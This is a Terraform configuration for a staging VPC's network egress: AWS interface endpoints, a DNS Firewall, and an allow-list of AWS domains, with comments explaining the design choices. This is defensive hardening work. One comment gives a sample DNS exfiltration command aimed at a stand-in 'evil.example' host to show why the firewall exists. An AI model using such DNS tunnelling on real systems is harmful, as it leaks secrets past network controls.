# staging/egress/ - Staging's [E] metered network (Stage 3 pass 3, re-cut by Stage 9 step 4.3a): the
# interface endpoints a job and a worker call, with step 9's org policy on every entry, and the DNS
# Firewall. Lifecycle belongs to `make up ENV=staging` / `make down ENV=staging` (D11) and to the
# promotion pipeline's Staging leg (Stage 8 step 3.1), never to a by-hand apply (runbook, "What you
# never do"); `./aws/egress.py` 6 is the burn meter.
#
# There is no NAT gateway here, and none anywhere in the estate: under D38 a spoke reaches the
# internet as a client of the explicit proxy in VPC-Networking rather than through a route, and this
# VPC's plane (`staging-foundation`) refuses everything by decision. A job's container under the
# Workloads OU's settings has no network, and a MWAA Serverless worker carries no proxy setting, so a
# call with no endpoint here never comes back as a proxy 403: it fails at the firewall, in about 2 s
# (`errno 16`, 6i), and without the firewall it resolves and hangs.
#
# foundation/'s [P] facts arrive through terraform_remote_state - never pasted (Lesson 3).

data "terraform_remote_state" "foundation" {
  backend = "s3"

  config = {
    bucket = "awsds-${var.env}-tfstate"
    key    = "${var.account_folder}/foundation/terraform.tfstate"
    region = var.region
  }
}

module "egress" {
  # checkov:skip=CKV_TF_1:pinned by git TAG by convention (conventions §6, Stage 3 step 1.1a) - a repository-internal tag only the repo owner can move
  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.17.0"

  env    = var.env
  vpc_id = data.terraform_remote_state.foundation.outputs.vpc_id

  # Single-AZ resources land in the first authored zone (D9) - a selection, not an anchor. No AZ pin
  # beyond it: 6i measured MWAA Serverless workers in both AZs reaching Sandbox's single-AZ endpoints,
  # and a job's VpcConfig names both subnets.
  #
  # No `egress_mode`, `nat_public_subnet_id` or `private_route_table_ids`: they went with the NAT at
  # `vpc-egress-v0.6.0` (6c step 5.1), and under D38 there is no route table for this slice to write to.
  endpoint_subnet_id         = data.terraform_remote_state.foundation.outputs.private_subnet_ids[var.zone_ids[0]]
  endpoint_security_group_id = data.terraform_remote_state.foundation.outputs.endpoints_security_group_id

  # VPC-Workloads' set (production/workloads-egress/, step 3.3a), so the Staging leg runs on the network
  # the Production leg runs on (D20): an endpoint a job lacks fails here, before the gate. Read against
  # this account's own run of 2026-10-19 (Stage 18 4.4, CloudTrail): the worker called `glue`,
  # `sagemaker.api`, `kms` and `logs` through these endpoints, and the job's image pull (`ecr.*`) and
  # Glue's job runner called from AWS's own addresses, through none of them. So `ecr.api`, `ecr.dkr`,
  # `athena`, `lakeformation`, `sagemaker.runtime` and `sagemaker.studio` leave the 2026-09-06 set, and
  # `secretsmanager` joins. A change joins both slices or carries its reason here:
  #   lakeformation  on step 2.4's reading of a job's vpcEndpointId, in both VPCs
  #   athena         when a job inside the VPC queries through it (an integration test's, Stage 8 3.3)
  #   the mwaa group Stage 10 step 1.2's worker set, in both VPCs (`monitoring` among its candidates)
  #
  # `datazone` stays out: `DenyDataZoneEntirely` refuses this account the service, and the endpoint
  # Stage 18 7.1 added for its window left with it.
  core_services  = ["sts", "logs", "kms", "glue"]
  extra_services = ["sagemaker.api", "secretsmanager"]

  # The firewall closes the VPC resolver as an exfiltration channel (6c step 5.7), which exists
  # wherever code runs, with or without a route: `dig secret-payload.evil.example` leaves through the
  # resolver one label at a time.
  dns_firewall = true

  # TRUST, as in the two other firewalled VPCs: every entry below is an AWS namespace, so AWS points
  # the chain beneath it.
  firewall_domain_redirection_action = "TRUST_REDIRECTION_DOMAIN"

  # AWS namespaces only, VPC-Workloads' list. Each of the six endpoints answers for
  # `<service>.<region>.amazonaws.com` and its `.api.aws` twin, plus `streaming-logs` for `logs`
  # (measured on Sandbox's endpoints, 2026-09-09), and the S3 gateway's names are under
  # `amazonaws.com` too. The apex sits beside each wildcard because a domain-list wildcard never
  # matches the apex, and every entry carries the trailing dot of EXC-04's repair.
  #
  # `sagemaker.aws`, `app.aws` and `on.aws` left with the `sagemaker.studio` and `ecr.dkr` endpoints
  # whose names they covered (6d step 8.8). The estate's private zones left too: nothing in this VPC
  # is a proxy client or reaches GitLab, so `proxy.awsds.internal`, `gitlab.awsds.internal` and every
  # `staging.awsds.internal` name answer NXDOMAIN here while the slice is up. A name a job needs joins
  # the list with it.
  dns_firewall_allow_domains = [
    "amazonaws.com.", "*.amazonaws.com.",
    "api.aws.", "*.api.aws.",
  ]
}
